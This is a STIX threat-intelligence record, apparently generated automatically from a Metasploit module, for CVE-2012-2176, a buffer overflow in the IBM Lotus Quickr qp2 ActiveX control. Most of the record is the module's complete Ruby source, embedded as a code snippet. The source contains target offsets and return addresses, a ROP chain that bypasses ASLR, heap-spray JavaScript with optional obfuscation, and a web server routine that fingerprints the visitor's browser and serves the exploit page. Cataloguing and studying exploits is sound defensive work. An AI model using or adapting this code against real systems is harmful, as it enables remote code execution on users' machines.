{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9573d4f0-169c-4d15-895d-ea1e94ba2380",
    "created": "2024-08-14T16:43:14.641643Z",
    "modified": "2024-08-14T16:43:14.641647Z",
    "name": "\"IBM Lotus QuickR qp2 ActiveX Buffer Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability on the UploadControl ActiveX. The vulnerability exists in the handling of the \"Attachment_Times\" property, due to the insecure usage of the _swscanf. The affected ActiveX is provided by the qp2.dll installed with the IBM Lotus Quickr product.  This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7 using the qp2.dll 8.1.0.1800. In order to bypass ASLR the no aslr compatible module msvcr71.dll is used. This one is installed with the qp2 ActiveX.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/quickr_qp2_bof.rb",
            "external_id": "quickr_qp2_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-2176"
        },
        {
            "source_name": "reference",
            "url": "http://www-01.ibm.com/support/docview.wss?uid=swg21596191"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"9.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :rank       => Rank,\n  #  :classid    => \"{05D96F71-87C6-11D3-9BE4-00902742D6E0}\",\n  #  :method     => \"Attachment_Times\"\n  #})\n\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"IBM Lotus QuickR qp2 ActiveX Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability on the UploadControl\n        ActiveX. The vulnerability exists in the handling of the \"Attachment_Times\"\n        property, due to the insecure usage of the _swscanf. The affected ActiveX is\n        provided by the qp2.dll installed with the IBM Lotus Quickr product.\n\n        This module has been tested successfully on IE6-IE9 on Windows XP, Vista and 7,\n        using the qp2.dll 8.1.0.1800. In order to bypass ASLR the no aslr compatible module\n        msvcr71.dll is used. This one is installed with the qp2 ActiveX.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Gaurav Baruah', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-2176' ],\n          [ 'OSVDB', '82166' ],\n          [ 'BID', '53678'],\n          [ 'ZDI', '12-134' ],\n          [ 'URL', 'http://www-01.ibm.com/support/docview.wss?uid=swg21596191' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 978,\n          'DisableNops' => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # qp2.dll 8.1.0.1800\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4', 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil,  'Offset' => '0x5F4', 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 8 on Windows XP SP3', { 'Rop' => :jre, 'Offset' => '0x5f4', 'Ret' => 0x7C346B52 } ], # pop esp # ret # msvcr71.dll\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil,  'Offset' => '0x5f4', 'Ret' => 0x0c0c0c0c } ],\n          [ 'IE 8 on Windows Vista',  { 'Rop' => :jre, 'Offset' => '0x5f4', 'Ret' => 0x7C346B52 } ], # pop esp # ret # msvcr71.dll\n          [ 'IE 8 on Windows 7',      { 'Rop' => :jre, 'Offset' => '0x5f4', 'Ret' => 0x7C346B52 } ], # pop esp # ret # msvcr71.dll\n          [ 'IE 9 on Windows 7',      { 'Rop' => :jre, 'Offset' => '0x5fe', 'Ret' => 0x7C346B52 } ]  # pop esp # ret # msvcr71.dll\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-05-23',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.0'\n      os_name = 'Windows Vista'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        print_status(\"Target selected as: #{t.name}\")\n        return t\n      end\n    end\n\n    return nil\n  end\n\n  def ie_heap_spray(my_target, p)\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(target.arch))\n    js_random_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    # Land the payload at 0x0c0c0c0c\n    case my_target\n    when targets[7]\n      # IE 9 on Windows 7\n      js = %Q|\n      function randomblock(blocksize)\n      {\n        var theblock = \"\";\n        for (var i = 0; i < blocksize; i++)\n        {\n          theblock += Math.floor(Math.random()*90)+10;\n        }\n        return theblock;\n      }\n\n      function tounescape(block)\n      {\n        var blocklen = block.length;\n        var unescapestr = \"\";\n        for (var i = 0; i < blocklen-1; i=i+4)\n        {\n          unescapestr += \"%u\" + block.substring(i,i+4);\n        }\n        return unescapestr;\n      }\n\n      var heap_obj = new heapLib.ie(0x10000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_random_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset_length = #{my_target['Offset']};\n      for (var i=0; i < 0x1000; i++) {\n        var padding = unescape(tounescape(randomblock(0x1000)));\n        while (padding.length < 0x1000) padding+= padding;\n        var junk_offset = padding.substring(0, offset_length);\n        var single_sprayblock = junk_offset + code + nops.substring(0, 0x800 - code.length - junk_offset.length);\n        while (single_sprayblock.length < 0x20000) single_sprayblock += single_sprayblock;\n        sprayblock = single_sprayblock.substring(0, (0x40000-6)/2);\n        heap_obj.alloc(sprayblock);\n      }\n      |\n\n    else\n      # For IE 6, 7, 8\n      js = %Q|\n      var heap_obj = new heapLib.ie(0x20000);\n      var code = unescape(\"#{js_code}\");\n      var #{randnop} = \"#{js_nops}\";\n      var nops = unescape(#{randnop});\n      while (nops.length < 0x80000) nops += nops;\n      var offset = nops.substring(0, #{my_target['Offset']});\n      var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n      while (shellcode.length < 0x40000) shellcode += shellcode;\n      var block = shellcode.substring(0, (0x80000-6)/2);\n      heap_obj.gc();\n      for (var i=1; i < 0x300; i++) {\n        heap_obj.alloc(block);\n      }\n      |\n\n    end\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    return js\n  end\n\n  def get_payload(t, cli)\n    code = payload.encoded\n\n    # No rop. Just return the payload.\n    return code if t['Rop'].nil?\n\n    # Both ROP chains generated by mona.py - See corelan.be\n    case t['Rop']\n    when :jre\n      print_status(\"Using JRE ROP\")\n      rop_payload = generate_rop_payload('java', code)#, {'pivot'=>stack_pivot})\n    end\n\n    return rop_payload\n  end\n\n  def load_exploit_html(my_target, cli)\n    p  = get_payload(my_target, cli)\n    js = ie_heap_spray(my_target, p)\n\n    bof = rand_text_alpha(512) # offset to eip\"\n    bof << [my_target.ret].pack(\"V\")\n    if my_target['Rop']\n      bof << rand_text_alpha(4)\n      bof << [0x0c0c0c0c].pack(\"V\") # new stack\n    end\n\n    my_bof = Rex::Text.to_unescape(bof)\n\n    html = %Q|\n    <html>\n    <head>\n    <script>\n    #{js}\n    </script>\n    </head>\n    <body>\n    <object id=\"UploadControl\" width=\"100%\" height=\"100%\" classid=\"clsid:05D96F71-87C6-11D3-9BE4-00902742D6E0\">\n      <param name=\"General_Mode\" value=\"1\">\n      <param name=\"General_URL\" value=\"http://#{rand_text_alpha(rand(10) + 5)}\">\n    </object>\n    <script>\n      var bof = unescape(\"#{my_bof}\");\n      var my_time = \"#{rand_text_numeric(2)}/#{rand_text_numeric(2)}/#{rand_text_numeric(4)} #{rand_text_numeric(2)}:#{rand_text_numeric(2)}:#{rand_text_numeric(2)} \";\n      my_time += bof;\n      my_time += \" GMT\";\n      UploadControl.Attachment_Times = my_time;\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    my_target = get_target(agent)\n    # Avoid the attack if no suitable target found\n    if my_target.nil?\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(my_target, cli)\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-05-23",
    "x_mitre_platforms": [
        "win'"
    ]
}